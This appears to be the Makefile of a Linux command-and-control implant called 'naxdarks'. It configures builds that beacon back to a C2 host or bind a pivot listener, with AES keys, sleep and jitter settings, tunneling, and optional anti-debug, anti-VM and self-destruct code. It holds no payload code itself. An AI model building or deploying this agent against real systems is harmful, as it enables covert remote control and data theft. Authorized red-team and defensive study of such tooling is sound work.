# naxdarks Linux Agent — Makefile
#
# CONNECT-OUT mode:
#   make NAX_TCP_MODE=connect \
#        NAX_C2_HOST=10.0.0.1 NAX_C2_PORT=4444 \
#        NAX_AES_KEY=<32hexchars> NAX_LISTENER_WM=0xdeadbeef
#
# BIND / PIVOT mode:
#   make NAX_TCP_MODE=bind \
#        NAX_BIND_PORT=4444 NAX_BIND_HOST=0.0.0.0 \
#        NAX_AES_KEY=<32hexchars> NAX_LISTENER_WM=0xdeadbeef
#
# Add NAX_DEBUG=1 to either for verbose debug output (prints to stderr).

CC           ?= gcc
# Derive STRIP from CC for cross-compilation
# arm-linux-gnueabihf-gcc -> arm-linux-gnueabihf-strip
# aarch64-linux-gnu-gcc   -> aarch64-linux-gnu-strip
# gcc                     -> strip
STRIP        ?= $(patsubst %-gcc,%-strip,$(filter %-gcc,$(CC)))
ifeq ($(STRIP),)
  STRIP      := strip
endif
NAX_AES_KEY     ?= 00000000000000000000000000000000
NAX_LISTENER_WM ?= 0xDEADBEEF
NAX_TCP_MODE    ?= connect
NAX_C2_HOST     ?= 127.0.0.1
NAX_C2_PORT     ?= 4444
NAX_BIND_PORT   ?= 4444
NAX_BIND_HOST   ?= 0.0.0.0
NAX_DEBUG       ?= 0
NAX_FORMAT      ?= elf
NAX_OPSEC       ?= 0
NAX_SLEEP_MS    ?= 5000
NAX_JITTER_PCT  ?= 0

BOF_SDK_DIR := deps/elf-bof
BOF_SDK_INC := $(BOF_SDK_DIR)/include

# ===== base CFLAGS =====
CFLAGS := -D_GNU_SOURCE -Os -Wall -Wextra -I $(BOF_SDK_INC) \
          -Wno-unused-parameter \
          -Wno-stringop-truncation \
          -Wno-format-truncation \
          -Wno-pointer-to-int-cast \
          -fPIE \
          -fno-builtin \
          -fvisibility=hidden \
          -fstack-protector-strong \
          -Iinclude \
          -DNAX_AES_KEY=\"$(NAX_AES_KEY)\" \
          -DNAX_LISTENER_WM=$(NAX_LISTENER_WM) \
          -DNAX_SLEEP_MS=$(NAX_SLEEP_MS) \
          -DNAX_JITTER_PCT=$(NAX_JITTER_PCT)

LDFLAGS := -pie -Wl,-Bstatic -lpthread -lz -Wl,-Bdynamic -Wl,-z,relro,-z,now -Wl,-z,noexecstack
OUTDIR  := _bin

# Select library for target architecture
ifeq ($(CC),aarch64-linux-gnu-gcc)
  BOF_SDK_LIB := $(BOF_SDK_DIR)/lib/libelf_bof_arm64.a
else
  BOF_SDK_LIB := $(BOF_SDK_DIR)/lib/libelf_bof_x64.a
endif

# ===== mode suffix (must be set before debug suffix) =====
ifeq ($(NAX_TCP_MODE),bind)
  CFLAGS  += -DNAX_TCP_MODE_BIND \
             -DNAX_BIND_PORT=$(NAX_BIND_PORT) \
             -DNAX_BIND_HOST=\"$(NAX_BIND_HOST)\"
  SUFFIX  := _bind
  SRCS    := src/agent.c src/Core/crypto.c src/Core/packer.c \
             src/Core/sysinfo.c src/Commands/commands.c \
             src/Commands/tunnel.c \
             src/Commands/zip.c \
             src/Transport/tcp_bind.c
  LDFLAGS_EXTRA :=
else ifeq ($(NAX_TCP_MODE),https)
  CFLAGS  += -DNAX_HTTPS_MODE \
             -DNAX_C2_HOST=\"$(NAX_C2_HOST)\" \
             -DNAX_C2_PORT=$(NAX_C2_PORT)
  SUFFIX  := _https
  SRCS    := src/agent.c src/Core/crypto.c src/Core/packer.c \
             src/Core/sysinfo.c src/Commands/commands.c \
             src/Commands/tunnel.c \
             src/Commands/zip.c \
             src/Transport/https.c \
             src/Transport/https_profile.c
  # OpenSSL: locate the correct library path for the target architecture.
  # On Debian/Ubuntu multiarch systems, cross-arch libs live under
  # /usr/lib/<triplet>/  and headers under /usr/include/<triplet>/.
  # Fall back to the default system paths for native x86_64 builds.
  ifneq ($(OPENSSL_INC),)
    CFLAGS += -I$(OPENSSL_INC)
  endif

  ifeq ($(CC),aarch64-linux-gnu-gcc)
    OPENSSL_TRIPLET := aarch64-linux-gnu
  else
    OPENSSL_TRIPLET :=
  endif
  ifneq ($(OPENSSL_TRIPLET),)
    CFLAGS       += -I/usr/include/$(OPENSSL_TRIPLET)
    LDFLAGS       = -pie -Wl,-Bstatic -lpthread -lz -Wl,-Bdynamic \
                    -L/usr/lib/$(OPENSSL_TRIPLET) -lssl -lcrypto -Wl,-z,relro,-z,now -Wl,-z,noexecstack
  else
    # Native x86_64 — use system default paths
    LDFLAGS       = -pie -Wl,-Bstatic -lpthread -lz -Wl,-Bdynamic -lssl -lcrypto -Wl,-z,relro,-z,now -Wl,-z,noexecstack
  endif
  LDFLAGS_EXTRA :=
else
  CFLAGS  += -DNAX_C2_HOST=\"$(NAX_C2_HOST)\" \
             -DNAX_C2_PORT=$(NAX_C2_PORT)
  SUFFIX  :=
  SRCS    := src/agent.c src/Core/crypto.c src/Core/packer.c \
             src/Core/sysinfo.c src/Commands/commands.c \
             src/Commands/tunnel.c \
             src/Commands/zip.c \
             src/Transport/tcp.c
  LDFLAGS_EXTRA :=
endif

# ===== opsec (anti-debug, anti-VM, self-destruct) =====
ifeq ($(NAX_OPSEC),1)
  CFLAGS  += -DNAX_OPSEC=1
  SRCS    += src/Opsec/opsec.c
endif

# ===== debug suffix (appended AFTER mode suffix) =====
ifeq ($(NAX_DEBUG),1)
  CFLAGS  += -DNAX_DEBUG -g -O0
  SUFFIX  := $(SUFFIX)_debug
endif

# ===== output format: elf (executable) or so (shared library) =====
ifeq ($(NAX_FORMAT),so)
  SRCS   += src/shared.c
  CFLAGS := $(subst -fPIE,-fPIC,$(CFLAGS))
  LDFLAGS := $(subst -pie,-shared,$(LDFLAGS))
  SUFFIX := $(SUFFIX).so
else
  SRCS   += src/main.c
endif

TARGET  := $(OUTDIR)/nax_linux$(SUFFIX)

.PHONY: all clean

all: $(OUTDIR)
	$(CC) $(CFLAGS) $(SRCS) -o $(TARGET) $(BOF_SDK_LIB) $(LDFLAGS) $(LDFLAGS_EXTRA)
ifeq ($(NAX_DEBUG),0)
	$(STRIP) $(TARGET)
endif
	@echo "[+] Built: $(TARGET)"

$(OUTDIR):
	mkdir -p $(OUTDIR)

clean:
	rm -rf $(OUTDIR)
